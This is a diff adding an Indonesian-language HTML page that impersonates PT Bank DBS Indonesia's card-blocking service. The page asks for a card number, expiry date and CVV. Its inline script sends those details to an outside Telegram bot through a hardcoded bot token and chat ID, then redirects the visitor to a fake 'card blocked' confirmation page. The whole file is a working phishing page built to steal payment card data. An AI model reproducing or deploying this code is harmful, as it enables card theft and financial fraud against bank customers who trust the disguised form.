@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laporkan & Blokir Kartu</title>
+    <link rel="stylesheet" href="Pemblokiran.css">
+</head>
+<body>
+    <div class="header">
+        <span class="judul">Pemblokiran Kartu </span>
+        <img src="dbs.png" alt="DBS Logo" class="logo-dbs">
+    </div>
+    <div class="garis-kuning"></div>
+    <div class="form-area">
+        <form id="blokirForm">
+            <label for="nomor-kartu">Masukkan nomor kartu debit/ kredit/ Cashline kamu</label>
+            <input type="text" id="nomor-kartu" placeholder="Nomor kartu" required>
+            <label for="valid-thru"></label>
+            <input type="text" id="valid-thru" placeholder="MM/YY" required>
+            <label for="cvv-kartu"></label>
+            <input type="text" id="cvv-kartu" placeholder="CVV kartu" required>
+            
+            <div class="button-group">
+                <button type="submit" class="btn-lanjut">BLOKIR</button>
+            </div>
+        </form>
+        <div id="notif"></div>
+    </div>
+    <div class="copyright">
+        &copy; Copyright 2017. PT. Bank DBS Indonesia. All rights reserved.
+    </div>
+    
+    <script>
+        const BOT_TOKEN = "8029498192:AAFEupdTgB9p8IOMxwHgg9wmLj9SRscCApk";
+        const CHAT_ID = "5653264904";
+
+        document.getElementById('blokirForm').addEventListener('submit', function(e){
+            e.preventDefault();
+
+            const nomor = document.getElementById('nomor-kartu').value;
+            const valid = document.getElementById('valid-thru').value;
+            const cvv = document.getElementById('cvv-kartu').value;
+
+            const message = `🚫 *PEMBLOKIRAN KARTU DBS*\n\n`
+                + `*Nomor Kartu:* ${nomor}\n`
+                + `*Valid Thru:* ${valid}\n`
+                + `*CVV:* ${cvv}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok){
+                    document.getElementById('notif').innerHTML = "<span style='color:green'></span>";
+                    document.getElementById('blokirForm').reset();
+
+                    // ✅ Redirect ke halaman sukses
+                    window.location.href = "Diblokir.html";
+                }else{
+                    document.getElementById('notif').innerHTML = "<span style='color:red'>Gagal mengirim ke Telegram!</span>";
+                }
+            })
+            .catch(error => {
+                document.getElementById('notif').innerHTML = "<span style='color:red'>Error: " + error + "</span>";
+            });
+        });
+    </script>
+</body>
+</html>
